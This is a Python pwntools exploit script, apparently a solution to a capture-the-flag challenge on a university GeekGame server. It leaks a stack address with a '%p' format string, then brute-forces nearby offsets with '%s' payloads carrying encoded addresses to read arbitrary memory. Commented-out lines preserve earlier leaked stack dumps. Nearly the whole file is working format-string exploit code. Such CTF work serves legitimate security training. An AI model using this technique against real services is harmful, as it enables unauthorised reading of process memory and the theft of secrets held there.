import pwn


with open('../token.txt', 'rb') as f:
    token = f.readline().rstrip(b'\n')


def main() -> None:
    c = pwn.remote('prob09.geekgame.pku.edu.cn', 10009)
    c.sendlineafter(b'Please input your token: ', token)
    c.sendlineafter(b'Please input your instruction:\n', b'%p')
    address_str = c.recvline()
    c.recvuntil(b'Please input your instruction:\n')
    address = int(address_str.decode('utf-8').rstrip('\n'), 16)
    # address_encoded = address.to_bytes(8, 'little')
    # print(address_str, address, address_encoded.hex())
    # # c.sendline(b'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' + address_encoded)
    # # b'0x7fffaddd62200xdeadbeef0x7fffaddd62200x7fffaddd62a0(nil)(nil)0x1d4b420001bf520xfdeadbeef0x5555557c1b700x735f797265765f610x74735f74657263650x676e6972(nil)(nil)(nil)(nil)(nil)0x63696c6275705f610x676e697274735f(nil)(nil)(nil)(nil)(nil)(nil)0x3445727b67616c660x46546e3152505f640x6f535f654430635f0xa7d597a34655f(nil)(nil)(nil)(nil)0x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x7fffaddd62200xa(nil)(nil)(nil)(nil) b\xdd\xad\xff\x7f\nPlease input your instruction:\n'
    # c.sendline(b'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%s%p%p%p%p%p' + address_encoded)
    # # b'0x7ffc8c0788900xdeadbeef0x7ffc8c0788900x7ffc8c078910(nil)(nil)0x1d4b420001bf520xfdeadbeef0x555556cafb700x735f797265765f610x74735f74657263650x676e6972(nil)(nil)(nil)(nil)(nil)0x63696c6275705f610x676e697274735f(nil)(nil)(nil)(nil)(nil)(nil)0x3445727b67616c660x46546e3152505f640x6f535f654430635f0xa7d597a34655f(nil)(nil)(nil)(nil)0x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257325702570250x7025702570257025a_public_string0xa(nil)(nil)(nil)(nil)\x90\x88\x07\x8c\xfc\x7f\nPlease input your instruction:\n'
    for offset in range(-2048, 2048, 1):
        read_address = address + offset
        address_encoded = read_address.to_bytes(8, 'little')
        if b'\n' in address_encoded:
            print(f'Skip address {address_encoded}')
        c.sendline(b'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%s%p%p%p%p%p' + address_encoded)
        print(c.recvuntil(b'Please input your instruction:\n')[563:])
    # read_address = 0x7ffff7f39139 + 8
    # # read_address = address
    # address_encoded = read_address.to_bytes(8, 'little')
    # c.sendline(b'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%s%p%p%p%p%p' + address_encoded)
    # print(c.recvuntil(b'Please input your instruction:\n')[563:])


if __name__ == "__main__":
    main()
